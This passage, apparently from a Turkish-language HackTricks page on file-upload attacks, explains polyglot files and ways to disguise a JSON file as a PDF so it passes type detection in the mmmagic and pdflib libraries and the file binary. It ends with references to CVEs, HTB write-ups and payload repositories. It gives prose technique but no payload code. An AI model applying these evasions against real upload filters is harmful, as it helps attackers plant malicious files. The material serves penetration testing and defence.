Polyglot dosyaların temel faydası, dosyaları türüne göre tarayan güvenlik önlemlerini aşabilme yetenekleridir. Çeşitli uygulamalarda yaygın uygulama, potansiyel olarak zararlı formatların (ör. JS, PHP veya Phar dosyaları) riskini azaltmak için yalnızca JPEG, GIF veya DOC gibi belirli dosya türlerine yüklemeye izin vermektir. Ancak bir polyglot, birden fazla dosya türünün yapısal kriterlerine uyduğunda, bu kısıtlamaları gizlice atlatabilir.

Uyarlanabilirliklerine rağmen, polyglot'lar sınırlamalarla karşılaşabilir. Örneğin, bir polyglot aynı anda bir PHAR file (PHp ARchive) ve bir JPEG barındırsa bile, yükleme başarısı platformun dosya uzantısı politikalarına bağlı olabilir. Sistem izin verilen uzantılar konusunda katıysa, bir polyglot'un yalnızca yapısal ikiliği yüklemeyi garanti etmeyebilir.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Geçerli bir JSON dosyasını PDF gibi sahte göstererek yükleyip dosya türü tespitlerinden nasıl kaçınılacağını gösteren teknikler (kaynak **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: İlk 1024 byte içinde `%PDF` magic byte'ları bulunduğu sürece geçerli sayılır (örneği yazıda bulunuyor)
- **`pdflib` library**: JSON içindeki bir field içine sahte bir PDF formatı ekleyin, böylece kütüphane bunun bir PDF olduğunu düşünecektir (örneği yazıda bulunuyor)
- **`file` binary**: Bir dosyadan 1048576 byte'a kadar okuyabilir. Sadece bu boyuttan daha büyük bir JSON oluşturun ki içeriği JSON olarak parse edemesin, sonra JSON içinde gerçek bir PDF'in başlangıç kısmını koyun ve PDF olduğunu düşünecektir

## Referanslar

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
